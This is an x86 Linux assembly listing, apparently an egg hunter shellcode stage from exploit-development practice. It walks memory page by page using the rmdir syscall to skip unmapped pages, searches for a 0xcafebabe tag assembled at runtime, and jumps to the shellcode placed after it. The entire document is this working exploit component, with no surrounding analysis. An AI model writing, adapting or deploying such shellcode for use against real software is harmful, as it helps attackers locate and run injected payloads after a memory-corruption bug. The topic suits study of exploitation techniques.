global _start

section .text
_start:
	cld			; clear direction flag for scasd
	xor ebx, ebx

egg_restart:
	push 0x28
	; int rmdir(const char *)
	pop eax
	; increment ebx to either align a page or check the next address
	inc ebx			; pathname
	int 0x80

	cmp al, 0xf2		; check for a page fault on the lower bits only
	jnz egg_check		; it's a valid page

	or bx, 0xfff		; not an addressable page
	jmp egg_restart		; check the next page (0xfff + 1 = PAGE_SIZE)

egg_check:
	mov eax, 0xcafebabd	; add initial not static egg value
	inc eax			; increment the value to decrease the size
	mov edi, ebx		; compare eax with edi
	scasd			; edi is incremented since the direction flag is zero
	jnz egg_restart		; egg not found, try the next address

	jmp edi			; edi points to the shellcode to execute
